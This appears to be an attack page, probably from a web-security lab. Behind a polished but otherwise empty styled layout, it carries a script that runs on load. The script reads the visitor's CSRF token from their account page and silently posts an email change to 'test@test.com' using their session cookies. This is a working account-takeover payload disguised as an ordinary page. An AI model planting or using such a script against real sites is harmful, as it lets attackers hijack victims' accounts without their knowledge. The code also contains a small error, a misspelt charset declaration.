<html>
<head>
<meta charset="UTM-8">

<style>
body {
  background: linear-gradient(135deg, #fefefe 0%, #e0eafc 100%);
  font-family: 'Tahoma', sans-serif;
  margin: 0;
  padding: 40px 0;
}

.main-container {
  background: #fff;
  box-shadow: 0 8px 32px rgba(100,100,170,0.14);
  max-width: 480px;
  margin: auto;
  padding: 32px 24px 24px 24px;
  border-radius: 24px;
}

.title {
  font-size: 24px;
  color: #4952d8;
  margin-bottom: 12px;
  text-align: center;
  font-weight: bold;
}

.banner {
  width: 100%;
  border-radius: 12px;
  margin-bottom: 16px;
}

.menu {
  display: flex;
  justify-content: center;
  gap: 18px;
  list-style: none;
  margin: 0 0 16px 0;
  padding: 0;
  background: #f3f4ff;
  border-radius: 8px;
}

.menu li a {
  display: block;
  color: #4952d8;
  font-weight: bold;
  text-decoration: none;
  padding: 8px 14px;
  border-radius: 5px;
  transition: background 0.2s;
}
.menu li a:hover {
  background: #ebedfa;
}

.content {
  margin-top: 16px;
}

.content p {
  color: #444977;
  margin-bottom: 12px;
  font-size: 18px;
}

pre {
  background: #fffbec;
  color: #315243;
  padding: 12px;
  border-radius: 8px;
  font-size: 14px;
  margin-bottom: 14px;
  overflow-x: auto;
}

.notice {
  color: #009688;
  font-weight: bold;
  font-size: 15px;
  display: block;
  margin-top: 10px;
}

</style>

</head>
<body>
  

<script>


(async()=>{
  let t = (await (await fetch('/my-account',{credentials:'include'})).text())
           .match(/name="csrf" value="(\w+)"/)[1];
  fetch('/my-account/change-email',{
    method:'POST',
    credentials:'include',
    headers:{'Content-Type':'application/x-www-form-urlencoded'},
    body:`csrf=${t}&email=test@test.com`
  });
})();

</script>
</body>
</html>
